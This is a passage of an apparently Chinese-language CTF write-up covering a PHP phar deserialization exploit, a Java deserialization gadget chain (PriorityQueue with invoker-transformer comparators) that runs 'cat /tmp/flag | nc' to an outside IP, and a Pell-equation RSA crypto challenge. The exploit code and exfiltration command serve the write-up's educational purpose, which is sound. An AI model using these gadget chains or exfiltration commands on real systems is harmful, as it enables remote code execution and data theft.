class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>运行脚本生成 payload <code>phar.phar</code> 文件，上传该文件，最后 <code>GET</code> 请求获取 flag ：：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php phar_gen.php</span><br><span class="line"></span><br><span class="line">curl -X POST -F &quot;file=@phar.phar&quot; http://127.0.0.1:54018/</span><br><span class="line"></span><br><span class="line">curl &quot;http://127.0.0.1:54018/?img_file=phar://check.jpg/test.txt&quot;</span><br></pre></td></tr></table></figure><p></p><p><code>W4terCTF&#123;uNsErl4I1z3_tH3_pH4r_ArCh1v3_TO_ReveAl_tHE_hIDdEn_tREASUrE_OF_7h3_Php_5Erver&#125;</code></p><h2 id="just-readobject"><a class="anchor" href="#just-readobject">#</a> Just ReadObject</h2><p>先贴 payload：</p><p>突破口是队友查到的一个比较有名的案例：Java 的优先队列序列化的时候，会把元素一个一个 add 进去，而 add 需要元素之间的比较。如果优先队列初始化时指定了比较器，会直接调用比较器的 <code>compare</code> 方法。</p><p>参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFsL2Jsb2IvYjdkMGYyN2I0NmFmMDZiYmNlZDdkYmFmZGRjNDk2NzgxNzlkMzcwOC9zcmMvbWFpbi9qYXZhL3lzb3NlcmlhbC9wYXlsb2Fkcy9Db21tb25zQ29sbGVjdGlvbnM3LmphdmEjTDY=">ysoserial/src/main/java/ysoserial/payloads/CommonsCollections7.java at b7d0f27b46af06bbced7dbafddc49678179d3708 · frohoff/ysoserial · GitHub</span></p><p>而 jar 包里有个 <code>W4terTransformingComparator</code> ，它实现了 <code>Comparator</code> ，可以作为优先队列的比较器，并且它的 <code>compare</code> 方法非常的狂野：</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    value1 = <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>大概就是会调用两个比较对象的 <code>transform</code> 方法，然后呢这个类还有个 <code>decorated</code> 字段，类型是这个类自己，上面两个 <code>transform</code> 调用完，会接着调用 <code>decorated</code> 的 <code>compare</code> 方法，相当于一个 <code>W4terTransformingComparator</code> 类型的链表。</p><p>那对于 transformer 呢，jar 包里还有一个 <code>W4terInvokerTransformer</code> ，这个更狂野，它有这三个字段：方法名，参数类型定义列表，参数列表。这几个字段在序列化过程就可以完成加载。</p><p>而它的 <code>transform(Object obj)</code> 方法，会直接根据上面的三个参数， <code>invoke</code> 这个 <code>obj</code> 的指定方法。</p><p>所以可以用它构造一个优先队列，指定比较器为这么一个比较器链表，每一级比较器都可以对 obj 用任意参数执行任意方法，并且优先队列里的元素也可以自己塞。</p><p>首先想到的是 <code>Runtime.getRuntime().exec(cmd)</code> ，由于 <code>Runtime</code> 是不可序列化的运行时 context，需要用反射获取，我们的方法是 <code>Class.class.forName(&quot;java.lang.Runtime&quot;)</code> 。</p><p>也就是说优先队列里要先塞个 <code>Class.class</code> ，然后把上面的调用链拉成 <code>W4terTransformingComparator</code> 的链表即可。payload 如下：</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comp_empty</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">W4terComparator</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">W4terTransformer</span> <span class="variable">trans_for_name</span> <span class="operator">=</span> </span><br><span class="line">W4terInvokerTransformer.invokerTransformer(</span><br><span class="line">    <span class="string">&quot;forName&quot;</span>, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;java.lang.Runtime&quot;</span>&#125;</span><br><span class="line">);</span><br><span class="line"><span class="type">W4terTransformer</span> <span class="variable">trans_get_method</span> <span class="operator">=</span> </span><br><span class="line">W4terInvokerTransformer.invokerTransformer(</span><br><span class="line">    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">);</span><br><span class="line"><span class="type">W4terTransformer</span> <span class="variable">trans_exec</span> <span class="operator">=</span> </span><br><span class="line">W4terInvokerTransformer.invokerTransformer(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String[].class&#125;, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /tmp/flag | nc 172.18.198.218 6666&quot;</span></span><br><span class="line">    &#125;&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">W4terTransformer</span> <span class="variable">trans_invoke</span> <span class="operator">=</span> </span><br><span class="line">W4terInvokerTransformer.invokerTransformer(</span><br><span class="line">    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">W4terTransformingComparator</span> <span class="variable">comp_final</span> <span class="operator">=</span> </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">W4terTransformingComparator</span>(</span><br><span class="line">        trans_for_name,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">W4terTransformingComparator</span>(</span><br><span class="line">            trans_get_method,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">W4terTransformingComparator</span>(</span><br><span class="line">                trans_invoke,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">W4terTransformingComparator</span>(</span><br><span class="line">                    trans_exec,</span><br><span class="line">                    comp_empty</span><br><span class="line">                )</span><br><span class="line">            ))</span><br><span class="line">    );</span><br><span class="line">PriorityQueue&lt;Class&gt; pq = </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Class&gt;(comp_final);</span><br><span class="line">pq.add(Class.class);</span><br><span class="line">pq.add(Class.class);</span><br><span class="line"></span><br><span class="line">serialize(pq, <span class="string">&quot;hack.obj&quot;</span>);</span><br></pre></td></tr></table></figure><p></p><p>本地开 nc 监听 6666 端口，然后上传 <code>hack.obj</code> 即可立刻收到 flag。</p><h1 id="crypto"><a class="anchor" href="#crypto">#</a> Crypto</h1><h2 id="smoke-hints"><a class="anchor" href="#smoke-hints">#</a> Smoke hints</h2><p>从 task.py 可以得到以下信息</p><p>以下将 hint1~hint5 简写为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">h_1 -h_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span></p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">h_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 是随机生成的 18 位素数</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mi>e</mi><mi mathvariant="normal">%</mi><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">h_2=(h_1-2)!e\%h_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord">2</span><span class="mclose">)</span><span class="mclose">!</span><span class="mord mathnormal">e</span><span class="mord">%</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>3</mn></msub><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mi>p</mi><msup><mn>2</mn><mn>256</mn></msup></mfrac><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">h_3=\lfloor\frac{p}{2^{256}}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-.345em"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.7475em"><span style="top:-2.6550000000000002em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.7463142857142857em"><span style="top:-2.786em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.446108em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.345em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></p></li><li d.bit\_length()4=""><p>h_4=d\%2^</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi></mrow><annotation encoding="application/x-tex">h_5=x^2p+y^2q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:.03588em">q</span></span></span></span></p></li></ul><p>还给了 n 和 c</p><p>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>114514</mn><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>11680542514</mn><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mn>1919810</mn><mo>=</mo><mn>2034324</mn></mrow><annotation encoding="application/x-tex">114514 x^2 - 11680542514 y^2 + 1919810 = 2034324</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.897438em;vertical-align:-.08333em"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">4</span><span class="mord">5</span><span class="mord">1</span><span class="mord">4</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">0</span><span class="mord">5</span><span class="mord">4</span><span class="mord">2</span><span class="mord">5</span><span class="mord">1</span><span class="mord">4</span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">9</span><span class="mord">8</span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord">2</span><span class="mord">4</span></span></span></span></p><p>化简后得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>102001</mn><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2-102001y^2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.897438em;vertical-align:-.08333em"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span></span></span></span></p><p>使用下面的脚本求得 x 和 y 的值</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solvePell</span>(<span class="params">n</span>):</span><br><span class="line">    x = <span class="built_in">int</span>(math.sqrt(n))</span><br><span class="line">    y, z, r = x, <span class="number">1</span>, x &lt;&lt; <span class="number">1</span></span><br><span class="line">    e1, e2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    f1, f2 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = r * z - y</span><br><span class="line">        z = (n - y * y) // z</span><br><span class="line">        r = (x + y) // z</span><br><span class="line"></span><br><span class="line">        e1, e2 = e2, e1 + e2 * r</span><br><span class="line">        f1, f2 = f2, f1 + f2 * r</span><br><span class="line"></span><br><span class="line">        a, b = f2 * x + e2, f2</span><br><span class="line">        <span class="keyword">if</span> a * a - n * b * b == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> a, b</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [<span class="number">102001</span>]:</span><br><span class="line">    x, y = solvePell(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x^2 - %3d * y^2 = 1\nx = %27d\n y = %25d&quot;</span> % (n, x, y))</span><br></pre></td></tr></table></figure><p></p><p>根据</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi><mo>=</mo><msub><mi>h</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>q</mi><mo>=</mo><mi>n</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} x^2p+y^2q=h_5\\ pq=n \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em"></span><span class="minner"><span class="mopen delimcenter" style="top:0"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em"><span style="top:-3.69em"><span class="pstrut" style="height:3.008em"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em"><span class="pstrut" style="height:3.008em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>得到</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><msup><mi>q</mi><mn>2</mn></msup><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub><mi>q</mi><mo>+</mo><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y^2q^2-h_5q+nx^2=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span 